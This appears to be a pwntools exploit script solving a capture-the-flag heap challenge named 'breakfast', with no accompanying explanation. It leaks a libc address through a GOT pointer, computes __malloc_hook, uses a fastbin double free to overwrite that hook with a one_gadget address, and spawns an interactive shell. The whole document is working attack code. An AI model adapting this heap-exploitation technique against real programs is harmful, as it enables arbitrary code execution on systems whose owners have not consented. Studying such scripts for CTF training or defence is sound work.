#!/usr/bin/env python
from pwn import *
p=process('./breakfast')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def debugf(load=''):
    gdb.attach(p,load+'\n')

def menu(i):
    ru('5.- Exit\n')
    sl(str(i))

def new(index,size):
    menu(1)
    ru('fast\n')
    sl(str(index))
    ru('kcal.\n')
    sl(str(size))

def edit(index,content):
    menu(2)
    ru('ients\n')
    sl(str(index))
    ru('ingredients\n')
    sl(content)

def view(index):
    menu(3)
    ru('see\n')
    sl(str(index))

def delete(index):
    menu(4)
    ru('delete\n')
    sl(str(index))

new(0,66)
edit(0,p64(0x601FB8))
view(0)
line=u64(ru('1.- Cr')[0:8])
# print(hex(line))
libc_base=line-0x6f690
print(hex(libc_base))
libc.address=libc_base
malloc_hook=libc.symbols['__malloc_hook']
print(hex(malloc_hook))
# debugf()

malloc_hook_target=malloc_hook-0x23

new(1,0x60)
new(2,0x60)
delete(1)
delete(2)
delete(1)

new(1,0x60)
edit(1,p64(malloc_hook_target))
new(2,0x60)
new(3,0x60)
new(4,0x60)
one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
one_off=0xf1147
one=libc_base+one_off
edit(4,'\x00'*0x13+p64(one))



p.interactive()
